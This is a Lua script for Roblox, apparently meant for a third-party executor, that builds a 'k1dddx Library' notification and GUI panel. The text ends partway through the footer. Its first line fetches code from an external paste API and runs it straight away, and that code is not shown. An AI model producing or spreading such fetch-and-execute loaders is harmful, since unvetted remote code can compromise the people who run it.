loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/izI9vKjI28kL2Sny/raw", true))()
-- k1dddx GUI (updated)
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- ========== k1dddx Library (simple) ==========
local k1dddxLib = {}
k1dddxLib.Name = "k1dddx"
k1dddxLib.Version = "1.0"

-- simple on-screen notification (visual only)
function k1dddxLib.Notify(text, duration)
    duration = duration or 2
    pcall(function()
        local gui = Instance.new("ScreenGui")
        gui.IgnoreGuiInset = true
        gui.ResetOnSpawn = false
        gui.Name = "k1dddx_NotifyGui"
        gui.Parent = player:WaitForChild("PlayerGui")

        local frame = Instance.new("Frame", gui)
        frame.Size = UDim2.new(0, 260, 0, 36)
        frame.Position = UDim2.new(0.5, -130, 0.15, 0)
        frame.BackgroundTransparency = 0.15
        frame.BackgroundColor3 = Color3.fromRGB(10,10,10)
        frame.BorderSizePixel = 0
        frame.ZIndex = 9999
        frame.AnchorPoint = Vector2.new(0.5, 0)
        Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)

        local label = Instance.new("TextLabel", frame)
        label.Size = UDim2.new(1, -12, 1, 0)
        label.Position = UDim2.new(0, 6, 0, 0)
        label.BackgroundTransparency = 1
        label.Text = tostring(text)
        label.TextColor3 = Color3.fromRGB(255,255,255)
        label.Font = Enum.Font.GothamBold
        label.TextSize = 14
        label.TextWrapped = true

        spawn(function()
            TweenService:Create(frame, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {Position = UDim2.new(0.5, -130, 0.12, 0)}):Play()
            wait(duration)
            TweenService:Create(frame, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {Position = UDim2.new(0.5, -130, 0.08, 0), BackgroundTransparency = 1}):Play()
            wait(0.2)
            gui:Destroy()
        end)
    end)
end

-- expose library globally so other local scripts can use it
_G.k1dddxLib = k1dddxLib

-- ========== GUI setup ==========
local gui = Instance.new("ScreenGui")
gui.Name = "KuniHubPremiumGUI"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = player:WaitForChild("PlayerGui")

-- Main frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 220, 0, 226)
frame.Position = UDim2.new(0.5, -110, 0.5, -113)
frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 0
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

-- Warning message at startup
local warningLabel = Instance.new("TextLabel")
warningLabel.Size = UDim2.new(1, 0, 0, 20)
warningLabel.Position = UDim2.new(0, 0, 0, -24)
warningLabel.BackgroundTransparency = 0.2
warningLabel.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
warningLabel.Text = "âš  GUI is still loading..."
warningLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
warningLabel.Font = Enum.Font.GothamBold
warningLabel.TextSize = 14
warningLabel.Parent = frame
Instance.new("UICorner", warningLabel).CornerRadius = UDim.new(0, 6)

-- Fade out warning after 5 seconds
spawn(function()
    wait(5)
    TweenService:Create(warningLabel, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        TextTransparency = 1,
        BackgroundTransparency = 1
    }):Play()
    wait(0.6)
    warningLabel:Destroy()
end)

-- RGB glow border
local glow = Instance.new("Frame")
glow.Size = UDim2.new(1, 8, 1, 8)
glow.Position = UDim2.new(0, -4, 0, -4)
glow.BackgroundColor3 = Color3.fromHSV(0, 1, 1)
glow.BorderSizePixel = 0
glow.ZIndex = 0
glow.Parent = frame
Instance.new("UICorner", glow).CornerRadius = UDim.new(0, 16)

spawn(function()
    local hue = 0
    while gui.Parent do
        hue = (hue + 0.007) % 1
        glow.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
        wait(0.03)
    end
end)

-- Title (changed to k1dddx)
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -70, 0, 32)
title.Position = UDim2.new(0, 10, 0, 10)
title.BackgroundTransparency = 1
title.Text = "k1dddx Library"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBlack
title.TextSize = 22
title.TextStrokeTransparency = 0.6
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = frame

-- Footer (TikTok changed)
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, 0, 0, 16)
footer.Position = UDim2.new(0, 0, 1, -20)
footer.BackgroundTransparency = 1
